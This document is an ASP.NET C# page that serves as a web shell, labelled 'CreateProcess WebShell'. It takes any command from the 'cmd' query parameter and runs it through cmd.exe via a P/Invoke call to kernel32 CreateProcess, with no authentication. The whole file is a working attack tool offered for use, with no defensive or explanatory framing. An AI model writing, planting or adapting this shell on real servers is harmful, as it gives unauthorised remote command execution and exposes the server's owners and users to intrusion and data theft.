<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<script runat="server">
    [DllImport("kernel32.dll")]
    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
                                     IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags,
                                     IntPtr lpEnvironment, string lpCurrentDirectory, byte[] lpStartupInfo, out byte[] lpProcessInformation);
    protected void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request.QueryString["cmd"];
        if (!string.IsNullOrEmpty(cmd))
        {
            byte[] si = new byte[68];
            byte[] pi = new byte[16];
            bool success = CreateProcess(null, "cmd.exe /c " + cmd, IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, si, out pi);
            Response.Write("Process created: " + success);
        }
    }
</script>
<html><body><h2>CreateProcess WebShell</h2><form>Command: <input type="text" name="cmd" size=50 /></form></body></html>
